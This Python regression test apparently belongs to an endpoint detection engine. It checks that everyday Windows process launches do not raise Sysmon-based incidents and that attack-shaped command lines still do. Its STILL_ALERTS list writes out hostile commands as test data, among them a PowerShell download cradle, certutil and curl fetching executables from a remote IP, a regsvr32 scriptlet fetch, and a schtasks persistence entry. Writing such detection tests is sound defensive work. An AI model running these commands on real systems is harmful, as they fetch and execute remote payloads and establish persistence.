#!/usr/bin/env python3
"""Benign process launches must not raise incidents (the Sysmon EID 1 path).

Measured 2026-09-25 through the real `classify_sysmon(1, ...)` path and the
engine's own incident gate (severity >= medium): 82% of the Elastic benign
corpus (731 real software launches that once tripped an Elastic rule) and 72%
of ordinary workstation launches raised an incident. The single biggest cause
was that ANY start of cmd/powershell/rundll32/curl/schtasks/sc... was MEDIUM
on the binary name alone; the rest were automation flags (-NoProfile), a lone
Invoke-Expression or Invoke-WebRequest scored as a "download cradle", node.exe
treated as an internet-facing server, PowerShell's -e matched on node/perl,
and a doubled path separator read as a UNC network path.

After the fixes: Elastic corpus 2.9%, everyday list 0%, with no loss of
detection (offline Tier A 70/90 and the live-shape replay unchanged).

This file pins that: the Elastic corpus must stay under a ceiling, and the
everyday list must stay at zero. The everyday list is hand-written, so passing
it is a regression guard, not evidence of a real-world FP rate; the Elastic
corpus is the independent half.
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
sys.path.insert(0, str(Path(__file__).resolve().parent))

from harness import Checks  # noqa: E402

from valkyrie.etw.sysmon import classify_sysmon  # noqa: E402
from valkyrie.telemetry import SEV_MEDIUM, severity_rank  # noqa: E402

SYS32 = "C:\\Windows\\System32\\"
PS = SYS32 + r"WindowsPowerShell\v1.0\powershell.exe"
_CORPUS = Path(__file__).resolve().parent.parent / "valkyrie" / "defaults" / "benign_corpus.elastic.json"

# Measured 2.9% (21/731) when this was written; the ceiling leaves headroom for
# a genuinely new rule's legitimate tradeoff, not for a regression of this size.
ELASTIC_CEILING = 0.04

EVERYDAY = [
    ("cmd.exe", "explorer.exe", r'"C:\Windows\system32\cmd.exe"'),
    ("powershell.exe", "explorer.exe", r'"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"'),
    ("powershell.exe", "Code.exe", r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoLogo'),
    ("cmd.exe", "Code.exe", r'C:\Windows\system32\cmd.exe /d /s /c "git --no-optional-locks status -z -uall"'),
    ("cmd.exe", "node.exe", r'C:\Windows\system32\cmd.exe /d /s /c "npm run build"'),
    ("cmd.exe", "python.exe", r'C:\Windows\system32\cmd.exe /c "where git"'),
    ("cmd.exe", "powershell.exe", r'cmd.exe /c ver'),
    ("cmd.exe", "msiexec.exe", r'C:\Windows\system32\cmd.exe /c del /q "C:\Program Files\App\old.dll"'),
    ("schtasks.exe", "svchost.exe", r'schtasks.exe /query /fo csv /nh'),
    ("sc.exe", "cmd.exe", r'sc query wuauserv'),
    ("curl.exe", "powershell.exe", r'curl.exe -s https://api.github.com/repos/python/cpython/releases/latest'),
    ("curl.exe", "cmd.exe", r'curl -L -o node.zip https://nodejs.org/dist/v20.0.0/node-v20.0.0-win-x64.zip'),
    ("certutil.exe", "cmd.exe", r'certutil -hashfile setup.exe SHA256'),
    ("wscript.exe", "explorer.exe", r'"C:\Windows\System32\WScript.exe" "C:\Users\alice\Desktop\backup.vbs"'),
    ("cscript.exe", "cmd.exe", r'cscript //nologo C:\Windows\System32\slmgr.vbs /dli'),
    ("rundll32.exe", "explorer.exe", r'C:\Windows\system32\rundll32.exe shell32.dll,Control_RunDLL desk.cpl'),
    ("regsvr32.exe", "msiexec.exe", r'C:\Windows\system32\regsvr32.exe /s "C:\Program Files\App\shellext.dll"'),
    ("msbuild.exe", "devenv.exe", r'MSBuild.exe Project.sln /p:Configuration=Release'),
    ("powershell.exe", "cmd.exe", r'powershell -NoProfile -Command "Get-ChildItem C:\Users\alice\Documents"'),
    ("powershell.exe", "Code.exe", r'powershell -NoProfile -ExecutionPolicy Bypass -File C:\Users\alice\.vscode\extensions\ms-vscode.powershell\modules\Start-EditorServices.ps1'),
    ("powershell.exe", "cmd.exe", r'powershell -NoProfile -Command "Invoke-WebRequest https://example.org/release.zip -OutFile release.zip"'),
    ("powershell.exe", "claude.exe", r'powershell -NoProfile -NonInteractive -Command "$s = Get-Content launcher.ps1 -Raw; Invoke-Expression -Command $s"'),
    ("node.exe", "cmd.exe", r'node -e "console.log(process.version)"'),
    ("wmic.exe", "cmd.exe", r'wmic os get caption'),
    ("installutil.exe", "msiexec.exe", r'InstallUtil.exe /u "C:\Program Files\Vendor\svc.exe"'),
    ("schtasks.exe", "msiexec.exe", r'schtasks /create /tn "Vendor\Updater" /tr "C:\Program Files\Vendor\update.exe" /sc daily /f'),
    ("cmd.exe", "powershell.exe", r'cmd.exe /c del /f C:\Users\Public\Temp\\stale.txt'),
]

# The attack shapes the precision fixes must NOT have blunted.
STILL_ALERTS = [
    ("powershell.exe", "cmd.exe", r"powershell IEX (New-Object Net.WebClient).DownloadString('http://x/y.ps1')"),
    ("powershell.exe", "cmd.exe", r'powershell -nop -w hidden -enc SQBFAFgAKAAnAGgAdAB0AHAA'),
    ("certutil.exe", "cmd.exe", r'certutil -urlcache -f http://10.0.0.5/a.exe a.exe'),
    ("regsvr32.exe", "cmd.exe", r'regsvr32 /s /n /u /i:\\10.0.0.5\x\a.sct scrobj.dll'),
    ("cmd.exe", "winword.exe", r'cmd.exe /c whoami'),
    ("cmd.exe", "w3wp.exe", r'cmd.exe /c whoami'),
    ("cmd.exe", "java.exe", r'cmd.exe /c curl http://10.0.0.5/x.exe -o x.exe'),
    ("installutil.exe", "cmd.exe", r'InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\bob\AppData\Local\Temp\a.dll'),
    ("schtasks.exe", "cmd.exe", r'schtasks /create /tn x /tr C:\Users\Public\evil.exe /sc onlogon'),
]


def _incident(image, parent, cmdline) -> bool:
    if "\\" not in image:
        image = PS if image.lower() == "powershell.exe" else SYS32 + image
    if parent and "\\" not in parent:
        parent = SYS32 + parent
    a = classify_sysmon(1, {"Image": image, "ParentImage": parent or SYS32 + "unknownparent.exe",
                            "CommandLine": cmdline, "ProcessId": 1, "ParentProcessId": 2})
    return bool(a) and severity_rank(a["severity"]) >= severity_rank(SEV_MEDIUM)


def main() -> int:
    c = Checks("benign launch false positives (Sysmon EID 1 -> incident gate)", expect_min=5)

    rows = [tuple(x) for x in json.loads(_CORPUS.read_text(encoding="utf-8"))["attributable"] if x[0]]
    fired = sum(_incident(*r) for r in rows)
    rate = fired / len(rows)
    c.check(f"Elastic benign corpus: {fired}/{len(rows)} = {rate:.1%} raise an incident "
            f"(ceiling {ELASTIC_CEILING:.0%}; was 81.8% before 2026-09-25)", rate <= ELASTIC_CEILING)

    for image, parent, cmd in EVERYDAY:
        c.check(f"everyday benign, no incident: {parent} -> {cmd[:70]}", not _incident(image, parent, cmd))
    for image, parent, cmd in STILL_ALERTS:
        c.check(f"attack shape still alerts: {parent} -> {cmd[:70]}", _incident(image, parent, cmd))
    return c.finish()


if __name__ == "__main__":
    sys.exit(main())
